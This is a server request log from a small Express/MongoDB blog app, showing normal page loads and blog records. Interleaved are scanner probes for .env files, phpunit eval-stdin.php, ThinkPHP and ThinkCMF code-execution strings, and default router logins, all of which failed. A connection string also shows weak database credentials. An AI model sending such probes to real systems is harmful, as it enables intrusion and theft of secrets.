GET /js/bootstrap.min.js 304 - - 0.505 ms
GET /favicon.ico - - - - ms
GET /blogdelete/ 200 833 - 2.355 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.407 ms
GET /css/bootstrap.min.css 304 - - 0.509 ms
GET /js/bootstrap.min.js 304 - - 1.206 ms
GET /js/jquery.min.js 304 - - 1.105 ms
GET /favicon.ico - - - - ms
GET /blogdelete/ 304 - - 1.418 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.438 ms
GET /css/bootstrap.min.css 304 - - 0.505 ms
GET /js/jquery.min.js 304 - - 0.592 ms
GET /js/bootstrap.min.js 304 - - 0.542 ms
GET /favicon.ico - - - - ms
GET /bloglist 304 - - 1.680 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.415 ms
GET /css/fontawesome-all.css 304 - - 1.118 ms
GET /css/bootstrap.min.css 304 - - 1.990 ms
GET /js/jquery.min.js 304 - - 0.544 ms
GET /js/bootstrap.min.js 304 - - 0.578 ms
GET /blogadd 304 - - 1.390 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.750 ms
GET /css/bootstrap.min.css 304 - - 1.118 ms
GET /js/jquery.min.js 304 - - 2.202 ms
GET /js/bootstrap.min.js 304 - - 0.459 ms
GET /bloglist 304 - - 1.240 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 1.162 ms
GET /css/bootstrap.min.css 304 - - 1.041 ms
GET /css/fontawesome-all.css 304 - - 1.819 ms
GET /js/bootstrap.min.js 304 - - 1.609 ms
GET /js/jquery.min.js 304 - - 0.671 ms
GET /favicon.ico - - - - ms
GET / 304 - - 2.674 ms
GET /stylesheets/style.css 304 - - 3.754 ms
GET /css/bootstrap.min.css 304 - - 0.455 ms
GET /js/jquery.min.js 304 - - 0.529 ms
GET /js/bootstrap.min.js 304 - - 0.418 ms
GET /bloglist 304 - - 1.315 ms
GET /stylesheets/style.css 304 - - 0.399 ms
GET /css/bootstrap.min.css 304 - - 0.997 ms
GET /css/fontawesome-all.css 304 - - 1.190 ms
GET /js/jquery.min.js 304 - - 0.529 ms
GET /js/bootstrap.min.js 304 - - 0.540 ms
GET /webfonts/fa-solid-900.woff2 304 - - 0.475 ms
GET / 304 - - 1.459 ms
GET /stylesheets/style.css 304 - - 0.361 ms
GET /js/jquery.min.js 304 - - 2.050 ms
GET /css/bootstrap.min.css 304 - - 0.883 ms
GET /js/bootstrap.min.js 304 - - 0.479 ms
GET /favicon.ico - - - - ms
GET /boaform/admin/formLogin?username=adminisp&psd=adminisp 404 1030 - 1.574 ms
GET / 304 - - 0.957 ms
GET /stylesheets/style.css 304 - - 0.332 ms
GET /css/bootstrap.min.css 304 - - 0.488 ms
GET /js/jquery.min.js 304 - - 0.567 ms
GET /js/bootstrap.min.js 304 - - 1.373 ms
Mongoose disconnected
Mongoose disconnected through Heroku app shutdown
(node:26940) DeprecationWarning: current URL string parser is deprecated, and will be removed in a future version. To use the new parser, pass option { useNewUrlParser: true } to MongoClient.connect.
(node:26940) DeprecationWarning: current Server Discovery and Monitoring engine is deprecated, and will be removed in a future version. To use the new Server Discover and Monitoring engine, pass option { useUnifiedTopology: true } to the MongoClient constructor.
Mongoose connected to mongodb://localhost/blogger
GET / 304 - - 10.366 ms
GET /stylesheets/style.css 304 - - 1.245 ms
GET /css/bootstrap.min.css 304 - - 2.229 ms
GET /js/bootstrap.min.js 304 - - 0.773 ms
GET /js/jquery.min.js 304 - - 1.687 ms
GET /bloglist 304 - - 2.426 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.447 ms
GET /css/bootstrap.min.css 304 - - 0.500 ms
GET /css/fontawesome-all.css 304 - - 0.610 ms
GET /js/jquery.min.js 304 - - 0.627 ms
GET /js/bootstrap.min.js 304 - - 0.458 ms
GET /webfonts/fa-solid-900.woff2 304 - - 0.560 ms
GET /blogadd 304 - - 1.404 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.533 ms
GET /css/bootstrap.min.css 304 - - 1.388 ms
GET /js/bootstrap.min.js 304 - - 0.653 ms
GET /js/jquery.min.js 304 - - 1.417 ms
GET /bloglist 304 - - 2.607 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.377 ms
GET /css/bootstrap.min.css 304 - - 1.076 ms
GET /css/fontawesome-all.css 304 - - 1.191 ms
GET /js/jquery.min.js 304 - - 0.552 ms
GET /js/bootstrap.min.js 304 - - 0.447 ms
GET /blogedit/ 304 - - 1.489 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.530 ms
GET /css/bootstrap.min.css 304 - - 1.369 ms
GET /js/bootstrap.min.js 304 - - 0.612 ms
GET /js/jquery.min.js 304 - - 1.390 ms
GET / 304 - - 1.459 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.711 ms
GET /css/bootstrap.min.css 304 - - 0.824 ms
GET /js/jquery.min.js 304 - - 0.574 ms
GET /js/bootstrap.min.js 304 - - 0.400 ms
GET / 304 - - 1.078 ms
GET /stylesheets/style.css 304 - - 0.344 ms
GET /css/bootstrap.min.css 304 - - 0.534 ms
GET /js/jquery.min.js 304 - - 0.546 ms
GET /js/bootstrap.min.js 304 - - 0.408 ms
GET /bloglist 304 - - 1.387 ms
GET /stylesheets/style.css 304 - - 1.033 ms
GET /css/bootstrap.min.css 304 - - 1.268 ms
GET /css/fontawesome-all.css 304 - - 1.398 ms
GET /js/jquery.min.js 304 - - 0.585 ms
GET /js/bootstrap.min.js 304 - - 0.441 ms
GET /webfonts/fa-solid-900.woff2 304 - - 0.514 ms
GET /blogadd 304 - - 1.291 ms
GET /stylesheets/style.css 304 - - 1.074 ms
GET /css/bootstrap.min.css 304 - - 2.017 ms
GET /js/bootstrap.min.js 304 - - 1.483 ms
GET /js/jquery.min.js 304 - - 2.163 ms
GET /favicon.ico - - - - ms
GET /.env 404 1371 - 1.673 ms
GET /admin/.env 404 1371 - 1.111 ms
GET /laravel/.env 404 1371 - 0.955 ms
GET /public/.env 404 1371 - 0.940 ms
GET /v1/.env 404 1371 - 1.572 ms
GET /app/.env 404 1371 - 0.935 ms
GET /config/.env 404 1371 - 0.924 ms
GET /core/.env 404 1371 - 0.873 ms
GET /apps/.env 404 1371 - 0.840 ms
GET /lib/.env 404 1371 - 0.916 ms
GET /cron/.env 404 1371 - 0.841 ms
GET /database/.env 404 1371 - 0.872 ms
GET /uploads/.env 404 1371 - 0.940 ms
GET /site/.env 404 1371 - 0.905 ms
GET /web/.env 404 1371 - 1.623 ms
GET /administrator/.env 404 1371 - 0.909 ms
POST /HNAP1/ 404 1453 - 1.984 ms
GET / 200 826 - 1.707 ms
GET / 200 826 - 0.975 ms
GET / 200 826 - 0.955 ms
GET /solr/admin/info/system?wt=json 404 1030 - 1.137 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 826 - 0.852 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 826 - 0.937 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 963 - 1.711 ms
POST /api/jsonws/invoke 404 1452 - 10.054 ms
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 963 - 0.977 ms
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1452 - 49.784 ms
GET / 200 826 - 1.726 ms
GET / 200 826 - 0.941 ms
GET /config/getuser?index=0 404 1030 - 2.874 ms
POST /GponForm/diag_Form?images/ 404 1453 - 0.751 ms
GET / 200 826 - 1.033 ms
GET / 200 826 - 0.931 ms
GET / 200 826 - 0.919 ms
GET / 200 826 - 0.938 ms
GET / 200 826 - 0.993 ms
GET /.git/config 404 1030 - 0.882 ms
GET /v2/_catalog 404 1030 - 0.716 ms
GET /.env 404 1371 - 0.620 ms
GET / 200 826 - 0.967 ms
GET / 200 826 - 1.356 ms
GET / 200 826 - 0.983 ms
GET / 200 826 - 0.729 ms
GET / 200 826 - 1.023 ms
GET / 200 826 - 0.948 ms
GET / 200 826 - 0.982 ms
POST /HNAP1/ 404 1453 - 0.891 ms
GET / 200 826 - 0.911 ms
GET / 200 826 - 0.999 ms
GET / 200 826 - 0.902 ms
POST /boaform/admin/formLogin 404 1452 - 1.015 ms
GET / 200 826 - 0.980 ms
GET / 200 826 - 0.992 ms
GET / 200 826 - 0.966 ms
GET /.env 404 1371 - 1.006 ms
POST / 404 1452 - 2.226 ms
GET / 304 - - 0.945 ms
GET /stylesheets/style.css 200 89 - 10.101 ms
GET /js/bootstrap.min.js 200 60044 - 1.224 ms
GET /css/bootstrap.min.css 200 160302 - 6.203 ms
GET /js/jquery.min.js 200 89476 - 3.033 ms
GET /blogadd 200 815 - 1.531 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.330 ms
GET /css/bootstrap.min.css 304 - - 0.406 ms
GET /js/jquery.min.js 304 - - 0.479 ms
GET /js/bootstrap.min.js 304 - - 0.444 ms
GET /bloglist 200 2900 - 4.452 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.360 ms
GET /css/bootstrap.min.css 304 - - 0.644 ms
GET /css/fontawesome-all.css 200 51609 - 2.181 ms
GET /js/jquery.min.js 304 - - 0.522 ms
GET /js/bootstrap.min.js 304 - - 0.374 ms
GET /webfonts/fa-solid-900.woff2 200 50372 - 2.355 ms
GET /blogadd 304 - - 1.000 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 1.331 ms
GET /css/bootstrap.min.css 304 - - 1.379 ms
GET /js/bootstrap.min.js 304 - - 1.335 ms
GET /js/jquery.min.js 304 - - 2.286 ms
GET /favicon.ico - - - - ms
GET /hudson 404 1030 - 1.583 ms
GET /boaform/admin/formLogin?username=ec8&psd=ec8 404 1030 - 1.016 ms
GET /solr/admin/info/system?wt=json 404 1030 - 0.936 ms
GET /?XDEBUG_SESSION_START=phpstorm 200 826 - 1.052 ms
GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> 200 826 - 0.939 ms
GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP 404 963 - 0.924 ms
GET /.env 404 1371 - 0.886 ms
POST / 404 1452 - 1.052 ms
GET /.env 404 1371 - 0.856 ms
POST / 404 1452 - 0.954 ms
GET / 200 826 - 0.987 ms
GET / 200 826 - 0.995 ms
GET /.env 404 1371 - 0.999 ms
POST / 404 1452 - 0.980 ms
POST /api/jsonws/invoke 404 1452 - 0.964 ms
GET / 200 826 - 0.888 ms
GET / 200 826 - 0.937 ms
GET / 200 826 - 1.065 ms
GET / 200 826 - 0.972 ms
GET / 200 826 - 0.946 ms
GET / 200 826 - 0.928 ms
GET / 200 826 - 0.929 ms
GET /muieblackcat 404 1030 - 1.600 ms
GET //phpMyAdmin/scripts/setup.php 404 963 - 0.794 ms
GET //phpmyadmin/scripts/setup.php 404 963 - 0.763 ms
GET //PMA/scripts/setup.php 404 963 - 0.881 ms
GET //admin/scripts/setup.php 404 963 - 0.737 ms
GET //dbadmin/scripts/setup.php 404 963 - 0.824 ms
GET //mysql/scripts/setup.php 404 963 - 0.911 ms
GET //webdav/wickd.php 404 963 - 0.901 ms
GET / 200 826 - 1.012 ms
GET /config/getuser?index=0 404 1030 - 0.926 ms
GET /boaform/admin/formLogin?username=admin&psd=admin 404 1030 - 1.004 ms
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 963 - 0.990 ms
POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1452 - 1.000 ms
GET / 200 826 - 0.884 ms
GET / 200 826 - 0.985 ms
GET /boaform/admin/formLogin?username=adminisp&psd=adminisp 404 1030 - 1.101 ms
GET / 200 826 - 1.005 ms
GET / 200 826 - 0.919 ms
GET / 200 826 - 0.955 ms
GET / 200 826 - 0.989 ms
(node:11534) DeprecationWarning: current URL string parser is deprecated, and will be removed in a future version. To use the new parser, pass option { useNewUrlParser: true } to MongoClient.connect.
(node:11534) DeprecationWarning: current Server Discovery and Monitoring engine is deprecated, and will be removed in a future version. To use the new Server Discover and Monitoring engine, pass option { useUnifiedTopology: true } to the MongoClient constructor.
Mongoose connected to mongodb://blogs:blogs@localhost/blogger
Getting blog list
[
  {
    _id: 5f7cf112fcfc283ef84dfe8b,
    blogTitle: 'Blog #1',
    blogText: 'I wrote this',
    createdOn: 2020-10-06T22:34:58.810Z,
    __v: 0
  },
  {
    _id: 5f7cf11cfcfc283ef84dfe8c,
    blogTitle: 'Another blog',
    blogText: 'Back at it again!',
    createdOn: 2020-10-06T22:35:08.662Z,
    __v: 0
  },
  {
    _id: 5f7cf12efcfc283ef84dfe8d,
    blogTitle: 'Yet another blog',
    blogText: 'Go ahead, edit! See what happens...\r\n\r\nI edited.',
    createdOn: 2020-10-06T22:35:26.123Z,
    __v: 0
  }
]
GET /api/blogs 200 309 - 36.648 ms
GET /bloglist 304 - - 59.288 ms
GET /stylesheets/style.css 304 - - 1.023 ms
GET /css/bootstrap.min.css 304 - - 0.523 ms
GET /css/fontawesome-all.css 304 - - 0.610 ms
GET /js/jquery.min.js 304 - - 0.554 ms
GET /js/bootstrap.min.js 304 - - 0.481 ms
GET /webfonts/fa-solid-900.woff2 304 - - 0.504 ms
Getting blog list
[
  {
    _id: 5f7cf112fcfc283ef84dfe8b,
    blogTitle: 'Blog #1',
    blogText: 'I wrote this',
    createdOn: 2020-10-06T22:34:58.810Z,
    __v: 0
  },
  {
    _id: 5f7cf11cfcfc283ef84dfe8c,
    blogTitle: 'Another blog',
    blogText: 'Back at it again!',
    createdOn: 2020-10-06T22:35:08.662Z,
    __v: 0
  },
  {
    _id: 5f7cf12efcfc283ef84dfe8d,
    blogTitle: 'Yet another blog',
    blogText: 'Go ahead, edit! See what happens...\r\n\r\nI edited.',
    createdOn: 2020-10-06T22:35:26.123Z,
    __v: 0
  }
]
GET /api/blogs 200 309 - 3.566 ms
GET /bloglist 304 - - 8.994 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.895 ms
GET /css/bootstrap.min.css 304 - - 1.187 ms
GET /css/fontawesome-all.css 304 - - 2.417 ms
GET /js/jquery.min.js 304 - - 0.569 ms
GET /js/bootstrap.min.js 304 - - 0.465 ms
GET /blogadd 200 1403 - 1.825 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.423 ms
GET /css/bootstrap.min.css 304 - - 0.894 ms
GET /js/jquery.min.js 304 - - 1.079 ms
GET /js/bootstrap.min.js 304 - - 0.459 ms
GET /favicon.ico - - - - ms
Getting blog list
[
  {
    _id: 5f7cf112fcfc283ef84dfe8b,
    blogTitle: 'Blog #1',
    blogText: 'I wrote this',
    createdOn: 2020-10-06T22:34:58.810Z,
    __v: 0
  },
  {
    _id: 5f7cf11cfcfc283ef84dfe8c,
    blogTitle: 'Another blog',
    blogText: 'Back at it again!',
    createdOn: 2020-10-06T22:35:08.662Z,
    __v: 0
  },
  {
    _id: 5f7cf12efcfc283ef84dfe8d,
    blogTitle: 'Yet another blog',
    blogText: 'Go ahead, edit! See what happens...\r\n\r\nI edited.',
    createdOn: 2020-10-06T22:35:26.123Z,
    __v: 0
  }
]
GET /api/blogs 200 309 - 4.531 ms
GET /bloglist 304 - - 9.696 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.427 ms
GET /css/fontawesome-all.css 304 - - 0.612 ms
GET /css/bootstrap.min.css 304 - - 0.483 ms
GET /js/jquery.min.js 304 - - 0.744 ms
GET /js/bootstrap.min.js 304 - - 0.469 ms
{
  _id: 5f7cf112fcfc283ef84dfe8b,
  blogTitle: 'Blog #1',
  blogText: 'I wrote this',
  createdOn: 2020-10-06T22:34:58.810Z,
  __v: 0
}
GET /api/blogs/5f7cf112fcfc283ef84dfe8b 200 129 - 5.185 ms
GET /blogedit/5f7cf112fcfc283ef84dfe8b 200 1449 - 10.457 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.368 ms
GET /css/bootstrap.min.css 304 - - 0.919 ms
GET /js/jquery.min.js 304 - - 1.093 ms
GET /js/bootstrap.min.js 304 - - 0.454 ms
Getting blog list
[
  {
    _id: 5f7cf112fcfc283ef84dfe8b,
    blogTitle: 'Blog #1',
    blogText: 'I wrote this',
    createdOn: 2020-10-06T22:34:58.810Z,
    __v: 0
  },
  {
    _id: 5f7cf11cfcfc283ef84dfe8c,
    blogTitle: 'Another blog',
    blogText: 'Back at it again!',
    createdOn: 2020-10-06T22:35:08.662Z,
    __v: 0
  },
  {
    _id: 5f7cf12efcfc283ef84dfe8d,
    blogTitle: 'Yet another blog',
    blogText: 'Go ahead, edit! See what happens...\r\n\r\nI edited.',
    createdOn: 2020-10-06T22:35:26.123Z,
    __v: 0
  }
]
GET /api/blogs 200 309 - 4.756 ms
GET /bloglist 304 - - 8.291 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.340 ms
GET /css/bootstrap.min.css 304 - - 0.457 ms
GET /css/fontawesome-all.css 304 - - 0.542 ms
GET /js/jquery.min.js 304 - - 0.507 ms
GET /js/bootstrap.min.js 304 - - 0.481 ms
GET /favicon.ico - - - - ms
Getting blog list
[
  {
    _id: 5f7cf112fcfc283ef84dfe8b,
    blogTitle: 'Blog #1',
    blogText: 'I wrote this',
    createdOn: 2020-10-06T22:34:58.810Z,
    __v: 0
  },
  {
    _id: 5f7cf11cfcfc283ef84dfe8c,
    blogTitle: 'Another blog',
    blogText: 'Back at it again!',
    createdOn: 2020-10-06T22:35:08.662Z,
    __v: 0
  },
  {
    _id: 5f7cf12efcfc283ef84dfe8d,
    blogTitle: 'Yet another blog',
    blogText: 'Go ahead, edit! See what happens...\r\n\r\nI edited.',
    createdOn: 2020-10-06T22:35:26.123Z,
    __v: 0
  }
]
GET /api/blogs 200 309 - 3.336 ms
GET /bloglist 304 - - 7.083 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.387 ms
GET /css/bootstrap.min.css 304 - - 0.488 ms
GET /css/fontawesome-all.css 304 - - 0.542 ms
GET /js/jquery.min.js 304 - - 0.687 ms
GET /js/bootstrap.min.js 304 - - 0.422 ms
GET / 304 - - 1.600 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 2.139 ms
GET /css/bootstrap.min.css 304 - - 2.366 ms
GET /js/jquery.min.js 304 - - 1.450 ms
GET /js/bootstrap.min.js 304 - - 0.416 ms
GET / 304 - - 1.271 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.425 ms
GET /js/jquery.min.js 304 - - 0.847 ms
GET /css/bootstrap.min.css 304 - - 0.441 ms
GET /js/bootstrap.min.js 304 - - 0.461 ms
Getting blog list
[
  {
    _id: 5f7cf112fcfc283ef84dfe8b,
    blogTitle: 'Blog #1',
    blogText: 'I wrote this',
    createdOn: 2020-10-06T22:34:58.810Z,
    __v: 0
  },
  {
    _id: 5f7cf11cfcfc283ef84dfe8c,
    blogTitle: 'Another blog',
    blogText: 'Back at it again!',
    createdOn: 2020-10-06T22:35:08.662Z,
    __v: 0
  },
  {
    _id: 5f7cf12efcfc283ef84dfe8d,
    blogTitle: 'Yet another blog',
    blogText: 'Go ahead, edit! See what happens...\r\n\r\nI edited.',
    createdOn: 2020-10-06T22:35:26.123Z,
    __v: 0
  }
]
GET /api/blogs 200 309 - 3.276 ms
GET /bloglist 304 - - 8.178 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.458 ms
GET /css/bootstrap.min.css 304 - - 1.349 ms
GET /css/fontawesome-all.css 304 - - 0.547 ms
GET /js/bootstrap.min.js 304 - - 0.994 ms
GET /js/jquery.min.js 304 - - 1.130 ms
GET /webfonts/fa-solid-900.woff2 304 - - 0.506 ms
GET /blogadd 304 - - 1.363 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 1.513 ms
GET /css/bootstrap.min.css 304 - - 2.361 ms
GET /js/jquery.min.js 304 - - 0.516 ms
GET /js/bootstrap.min.js 304 - - 0.419 ms
{
  blogTitle: 'This is a blog',
  blogText: 'lorem ipsum something something'
}
{
  _id: 5f847f8852b6272d0e0bb1d2,
  blogTitle: 'This is a blog',
  blogText: 'lorem ipsum something something',
  createdOn: 2020-10-12T16:08:40.938Z,
  __v: 0
}
POST /api/blogs/ 201 155 - 10.299 ms
POST /blogadd 302 62 - 16.383 ms
Getting blog list
[
  {
    _id: 5f7cf112fcfc283ef84dfe8b,
    blogTitle: 'Blog #1',
    blogText: 'I wrote this',
    createdOn: 2020-10-06T22:34:58.810Z,
    __v: 0
  },
  {
    _id: 5f7cf11cfcfc283ef84dfe8c,
    blogTitle: 'Another blog',
    blogText: 'Back at it again!',
    createdOn: 2020-10-06T22:35:08.662Z,
    __v: 0
  },
  {
    _id: 5f7cf12efcfc283ef84dfe8d,
    blogTitle: 'Yet another blog',
    blogText: 'Go ahead, edit! See what happens...\r\n\r\nI edited.',
    createdOn: 2020-10-06T22:35:26.123Z,
    __v: 0
  },
  {
    _id: 5f847f8852b6272d0e0bb1d2,
    blogTitle: 'This is a blog',
    blogText: 'lorem ipsum something something',
    createdOn: 2020-10-12T16:08:40.938Z,
    __v: 0
  }
]
GET /api/blogs 200 418 - 3.066 ms
GET /bloglist 200 3713 - 7.641 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.393 ms
GET /css/fontawesome-all.css 304 - - 0.761 ms
GET /css/bootstrap.min.css 304 - - 0.441 ms
GET /js/jquery.min.js 304 - - 0.531 ms
GET /js/bootstrap.min.js 304 - - 0.436 ms
GET /webfonts/fa-solid-900.woff2 304 - - 0.434 ms
GET /favicon.ico - - - - ms
GET /favicon.ico - - - - ms
GET / 200 826 - 0.934 ms
GET /stylesheets/style.css 200 89 - 0.446 ms
GET /js/bootstrap.min.js 200 60044 - 0.589 ms
GET /css/bootstrap.min.css 200 160302 - 2.236 ms
GET /js/jquery.min.js 200 89476 - 0.711 ms
GET /favicon.ico - - - - ms
Getting blog list
[
  {
    _id: 5f7cf112fcfc283ef84dfe8b,
    blogTitle: 'Blog #1',
    blogText: 'I wrote this',
    createdOn: 2020-10-06T22:34:58.810Z,
    __v: 0
  },
  {
    _id: 5f7cf11cfcfc283ef84dfe8c,
    blogTitle: 'Another blog',
    blogText: 'Back at it again!',
    createdOn: 2020-10-06T22:35:08.662Z,
    __v: 0
  },
  {
    _id: 5f7cf12efcfc283ef84dfe8d,
    blogTitle: 'Yet another blog',
    blogText: 'Go ahead, edit! See what happens...\r\n\r\nI edited.',
    createdOn: 2020-10-06T22:35:26.123Z,
    __v: 0
  },
  {
    _id: 5f847f8852b6272d0e0bb1d2,
    blogTitle: 'This is a blog',
    blogText: 'lorem ipsum something something',
    createdOn: 2020-10-12T16:08:40.938Z,
    __v: 0
  }
]
GET /api/blogs 200 418 - 4.028 ms
GET /bloglist 200 3713 - 7.859 ms
GET /css/bootstrap.min.css 304 - - 0.489 ms
GET /stylesheets/style.css 304 - - 0.698 ms
GET /js/bootstrap.min.js 304 - - 1.500 ms
GET /css/fontawesome-all.css 200 51609 - 1.461 ms
GET /js/jquery.min.js 304 - - 0.574 ms
GET /webfonts/fa-solid-900.woff2 200 50372 - 0.651 ms
GET /webfonts/fa-regular-400.woff2 200 12188 - 0.720 ms
GET /favicon.ico - - - - ms
GET /blogadd 200 1403 - 0.998 ms
GET /stylesheets/style.css 304 - - 0.355 ms
GET /js/bootstrap.min.js 304 - - 1.949 ms
GET /css/bootstrap.min.css 304 - - 0.823 ms
GET /js/jquery.min.js 304 - - 0.513 ms
GET /favicon.ico - - - - ms
Getting blog list
[
  {
    _id: 5f7cf112fcfc283ef84dfe8b,
    blogTitle: 'Blog #1',
    blogText: 'I wrote this',
    createdOn: 2020-10-06T22:34:58.810Z,
    __v: 0
  },
  {
    _id: 5f7cf11cfcfc283ef84dfe8c,
    blogTitle: 'Another blog',
    blogText: 'Back at it again!',
    createdOn: 2020-10-06T22:35:08.662Z,
    __v: 0
  },
  {
    _id: 5f7cf12efcfc283ef84dfe8d,
    blogTitle: 'Yet another blog',
    blogText: 'Go ahead, edit! See what happens...\r\n\r\nI edited.',
    createdOn: 2020-10-06T22:35:26.123Z,
    __v: 0
  },
  {
    _id: 5f847f8852b6272d0e0bb1d2,
    blogTitle: 'This is a blog',
    blogText: 'lorem ipsum something something',
    createdOn: 2020-10-12T16:08:40.938Z,
    __v: 0
  }
]
GET /api/blogs 200 418 - 3.042 ms
GET /bloglist 304 - - 6.413 ms
GET /stylesheets/style.css 304 - - 0.614 ms
GET /js/bootstrap.min.js 304 - - 1.788 ms
GET /css/bootstrap.min.css 304 - - 1.783 ms
GET /css/fontawesome-all.css 304 - - 2.827 ms
GET /js/jquery.min.js 304 - - 0.667 ms
GET /webfonts/fa-solid-900.woff2 304 - - 0.411 ms
GET /webfonts/fa-regular-400.woff2 304 - - 0.533 ms
GET / 200 826 - 1.827 ms
GET /.env 404 1418 - 1.536 ms
GET /.remote 404 1418 - 1.056 ms
GET /.local 404 1418 - 0.969 ms
GET /.production 404 1418 - 0.907 ms
POST //admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.878 ms
POST //api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.788 ms
POST //backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.779 ms
POST //blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.928 ms
POST //cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.787 ms
POST //crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.790 ms
POST //demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 1.548 ms
POST //dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.821 ms
POST //laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.812 ms
POST //lib/phpunit/Util/PHP/eval-stdin.php 404 1413 - 0.856 ms
POST //lib/phpunit/phpunit/Util/PHP/eval-stdin.php 404 1413 - 0.795 ms
POST //lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.828 ms
POST //lib/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.798 ms
POST //new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.809 ms
POST //old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.736 ms
POST //panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.796 ms
POST //phpunit/Util/PHP/eval-stdin.php 404 1413 - 0.744 ms
POST //phpunit/phpunit/Util/PHP/eval-stdin.php 404 1413 - 1.591 ms
POST //phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.734 ms
POST //phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.774 ms
POST //protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.801 ms
POST //sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.752 ms
POST //vendor/phpunit/Util/PHP/eval-stdin.php 404 1413 - 0.829 ms
POST //vendor/phpunit/phpunit/Util/PHP/eval-stdin.php 404 1413 - 0.802 ms
POST //vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.804 ms
POST //vendor/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.767 ms
POST //wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.799 ms
POST //wp-content/plugins/dzs-videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.795 ms
POST //wp-content/plugins/jekyll-exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.819 ms
POST //wp-content/plugins/mm-plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.766 ms
POST //www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php 404 1413 - 0.762 ms
GET / 200 826 - 0.942 ms
GET /stylesheets/style.css 200 89 - 0.635 ms
GET /js/bootstrap.min.js 200 60044 - 0.904 ms
GET /css/bootstrap.min.css 200 160302 - 0.567 ms
GET /js/jquery.min.js 200 89476 - 1.518 ms
GET /blogadd 200 1403 - 0.977 ms
GET /favicon.ico - - - - ms
GET /stylesheets/style.css 304 - - 0.326 ms
GET /css/bootstrap.min.css 304 - - 0.405 ms
GET /js/jquery.min.js 304 - - 0.482 ms
GET /js/bootstrap.min.js 304 - - 0.389 ms
{ blogTitle: 'Added by Prof Rogers', blogText: 'Test' }
{
  _id: 5f84997552b6272d0e0bb1d3,
  blogTitle: 'Added by Prof Rogers',
  blogText: 'Test',
  createdOn: 2020-10-12T17:59:17.163Z,
  __v: 0
}
POST /api/blogs/ 201 134 - 2.839 ms
POST /blogadd 302 62 - 6.603 ms
Getting blog list
[
  {
    _id: 5f7cf112fcfc283ef84dfe8b,
    blogTitle: 'Blog #1',
    blogText: 'I wrote this',
    createdOn: 2020-10-06T22:34:58.810Z,
    __v: 0
  },
  {
    _id: 5f7cf11cfcfc283ef84dfe8c,
    blogTitle: 'Another blog',
    blogText: 'Back at it again!',
    createdOn: 2020-10-06T22:35:08.662Z,
    __v: 0
  },
  {
